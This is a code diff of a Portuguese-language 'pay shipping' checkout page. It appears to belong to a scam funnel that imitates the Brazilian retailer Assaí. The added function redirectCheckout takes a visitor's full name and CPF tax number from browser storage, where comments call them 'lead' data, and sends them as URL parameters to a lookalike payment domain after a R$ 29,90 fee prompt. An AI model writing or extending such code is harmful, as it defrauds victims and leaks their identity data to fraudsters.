@@ -205,7 +205,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                     R$ 29,90
             </div>
 
-            <button onclick="this.innerHTML = '<i class=\'fas fa-spinner fa-spin\' style=\'margin-right: 10px;\'></i>Encaminhando para pagamento'; window.location.href = buildUrlWithParams('https://pay.zona-segurocn.site/a9ArZMlAxDv37xj')" class="button">
+            <button onclick="this.innerHTML = '<i class=\'fas fa-spinner fa-spin\' style=\'margin-right: 10px;\'></i>Encaminhando para pagamento'; redirectCheckout()" class="button">
                     Pagar Frete
             </button>
 
@@ -463,6 +463,25 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                 url.searchParams.append(key, params[key]);
             });
             return url.toString();
+        }
+
+        function redirectCheckout() {
+            localStorage.setItem('type', 'up1');
+    
+            // Busca os dados do CPF do localStorage (vindos da pasta 4)
+            const dadosCPF = JSON.parse(localStorage.getItem('dadosCPF')) || { 
+                nomeCompleto: "nome do lead", 
+                cpf: "cpf do lead"
+            };
+            
+            // Constrói a URL do Assaí com os parâmetros
+            const baseUrl = "https://pay.cartoes-assai.store/rn4RgQvm4DM3wBV";
+            const documentParam = dadosCPF.cpf || "cpf do lead";
+            const nameParam = encodeURIComponent(dadosCPF.nomeCompleto || "nome do lead");
+            
+            const finalUrl = `${baseUrl}?document=${documentParam}&name=${nameParam}`;
+            
+            window.location.href = finalUrl;
         }
     </script>
 
